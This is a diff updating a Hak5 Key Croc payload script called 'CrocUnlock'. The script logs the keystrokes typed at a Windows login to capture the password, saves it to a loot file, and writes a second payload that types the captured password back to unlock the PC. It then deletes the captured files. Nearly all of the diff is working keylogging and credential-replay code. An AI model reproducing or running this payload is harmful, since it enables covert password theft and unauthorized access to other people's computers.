@@ -1,7 +1,7 @@
 # Title:           CrocUnlock (payload #1)  
 # Description:     Log into windows pc
 # Author:          spywill / RootJunky
-# Version:         1.2
+# Version:         1.3
 # Category:        Key Croc
 #
 #
@@ -19,10 +19,11 @@ SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
      LED OFF;
 else
      LED SETUP
-     echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.2\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}
+     echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.3\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}
      echo \M\A\T\C\H crocunlock >> ${CROC_UNLOCK}
-     echo -e "LED ATTACK\nCROC_PASS=/root/udisk/loot/winpasswd.txt\n\$(sed -i -e '/^[crocunlock]/d' ${CROC_KEYS})\ncat ${CROC_KEYS} >> \${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nif [ -e \"\${CROC_PASS}\" ]; then" >> ${CROC_UNLOCK}
-     echo -e "      Q STRING \$(sed '\$!d' \${CROC_PASS})\n      Q ENTER\n      sleep 1\n      rm -f -r /root/udisk/loot/Croc_unlock.txt ${CROC_KEYS}\n      LED FINISH\n      sleep 2\n      LED OFF\nfi;" >> ${CROC_UNLOCK}
+     echo -e "LED SETUP\nsleep 1\nCROC_PASS=/root/udisk/loot/winpasswd.txt\nsed -i -e '/^[crocunlock]/d' ${CROC_KEYS}\ncat ${CROC_KEYS} >> \${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nif [ -e \"\${CROC_PASS}\" ]; then" >> ${CROC_UNLOCK}
+     echo -e "      LED ATTACK\n      sleep1\n      Q STRING \$(sed '\$!d' \${CROC_PASS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;" >> ${CROC_UNLOCK}
+     echo -e "else\n      LED R\n      sleep1\n      Q STRING \$(sed '\$!d' ${CROC_KEYS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\nfi;\n#\nrm -f /root/udisk/loot/Croc_unlock.txt" >> ${CROC_UNLOCK}
      LED ATTACK
      sleep 2
 SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
